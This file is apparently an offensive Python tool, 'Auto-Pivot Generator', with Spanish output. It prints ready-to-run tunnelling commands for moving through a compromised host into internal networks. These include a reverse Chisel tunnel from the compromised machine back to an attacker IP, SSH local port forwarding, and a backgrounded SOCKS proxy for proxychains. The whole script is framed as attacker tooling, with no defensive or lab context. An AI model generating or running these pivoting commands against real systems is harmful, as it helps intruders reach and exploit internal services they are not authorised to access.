#!/usr/bin/env python3
import argparse
import sys

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_section(title):
    print(f"\n{Colors.WARNING}--- {title} ---{Colors.ENDC}")

def generate_chisel(attacker_ip, attacker_port, internal_target, internal_port):
    print_section("Usando Chisel (Recomendado para Windows y Linux sin SSH)")
    print(f"{Colors.OKCYAN}1. En tu máquina atacante (Servidor):{Colors.ENDC}")
    print(f"   ./chisel server -p {attacker_port} --reverse")
    
    print(f"\n{Colors.OKCYAN}2. En la máquina comprometida (Cliente):{Colors.ENDC}")
    print(f"   ./chisel client {attacker_ip}:{attacker_port} R:{internal_port}:{internal_target}:{internal_port}")
    
    print(f"\n{Colors.OKGREEN}[+] Resultado: Podrás acceder a {internal_target}:{internal_port} yendo a localhost:{internal_port} en tu máquina atacante.{Colors.ENDC}")

def generate_ssh(user, pivot_ip, internal_target, internal_port):
    print_section("Usando SSH Local Port Forwarding")
    print(f"{Colors.OKCYAN}Ejecuta esto en tu máquina atacante:{Colors.ENDC}")
    print(f"   ssh -L {internal_port}:{internal_target}:{internal_port} {user}@{pivot_ip}")
    
    print(f"\n{Colors.OKGREEN}[+] Resultado: Se abrirá tu puerto local {internal_port} apuntando al {internal_port} del objetivo interno.{Colors.ENDC}")

def generate_dynamic_ssh(user, pivot_ip, socks_port=1080):
    print_section("Usando SSH Dynamic Port Forwarding (SOCKS Proxy)")
    print(f"{Colors.OKCYAN}Ejecuta esto en tu máquina atacante:{Colors.ENDC}")
    print(f"   ssh -D {socks_port} -f -C -q -N {user}@{pivot_ip}")
    
    print(f"\n{Colors.OKGREEN}[+] Resultado: Proxy SOCKS5 abierto en localhost:{socks_port}. Configura proxychains editando /etc/proxychains4.conf{Colors.ENDC}")

def main():
    parser = argparse.ArgumentParser(description="Generador de Comandos Auto-Pivot")
    parser.add_argument("--tool", choices=['chisel', 'ssh', 'dynamic-ssh'], required=True, help="Herramienta a usar")
    
    # Argumentos genéricos
    parser.add_argument("-a", "--attacker-ip", help="Tu IP de atacante (Para Chisel)")
    parser.add_argument("-p", "--attacker-port", default="8000", help="Puerto de escucha del server (Para Chisel)")
    parser.add_argument("-u", "--user", help="Usuario SSH de la máquina comprometida (Para SSH)")
    parser.add_argument("-m", "--machine-ip", help="IP pública de la máquina comprometida (Para SSH)")
    parser.add_argument("-t", "--target-internal", default="127.0.0.1", help="IP del host/servicio interno a alcanzar")
    parser.add_argument("-tp", "--target-port", default="8080", help="Puerto interno a alcanzar")
    
    args = parser.parse_args()

    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("=======================================")
    print("        AUTO-PIVOT GENERATOR           ")
    print("=======================================")
    print(f"{Colors.ENDC}")

    if args.tool == 'chisel':
        if not args.attacker_ip:
            print(f"{Colors.FAIL}[-] Error: Chisel requiere tu --attacker-ip (-a){Colors.ENDC}")
            sys.exit(1)
        generate_chisel(args.attacker_ip, args.attacker_port, args.target_internal, args.target_port)
        
    elif args.tool == 'ssh':
        if not args.user or not args.machine_ip:
            print(f"{Colors.FAIL}[-] Error: SSH Port Forwarding requiere --user (-u) y --machine-ip (-m){Colors.ENDC}")
            sys.exit(1)
        generate_ssh(args.user, args.machine_ip, args.target_internal, args.target_port)
        
    elif args.tool == 'dynamic-ssh':
        if not args.user or not args.machine_ip:
            print(f"{Colors.FAIL}[-] Error: Dynamic SSH requiere --user (-u) y --machine-ip (-m){Colors.ENDC}")
            sys.exit(1)
        # El target port lo usamos como proxy port en este caso
        generate_dynamic_ssh(args.user, args.machine_ip, socks_port=args.target_port)

if __name__ == "__main__":
    main()
